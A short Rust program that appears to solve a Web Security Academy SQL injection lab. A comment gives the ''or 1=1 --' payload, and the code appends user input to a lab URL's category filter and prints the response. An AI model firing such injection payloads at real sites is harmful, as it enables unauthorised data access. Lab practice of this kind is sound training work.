use reqwest;
use clap::Parser;

#[derive(Parser, Debug)]
#[command(version, about, long_about = None)]
struct Args {
    #[arg(short, long)]
    uri: String,
}

//Solution 'or 1=1 --
const URL: &str = "https://0ae1001c040e47fb80c83ff2003c0062.web-security-academy.net/filter?category=";

fn execut_query(url: &str) -> bool {
    let response = reqwest::blocking::get(url);
    println!("{}", url);
    let result = match response {
        Ok(ref r) => r.status().is_success(),
        Err(_) => false,
    };
    if result == false {
        return false;
    }
    println!("here");
    match response.unwrap().text() {
        Ok(body) => {
            println!("{}", body);
            body.contains("cat")
        },
        Err(_) => false,
    }
}

fn main() {
    let args = Args::parse();
    let result = execut_query(&(URL.to_string() + &args.uri));
    if result {
        println!("Send request finsih with success");
    }
    else {
        println!("Something went wrong");
    }
}
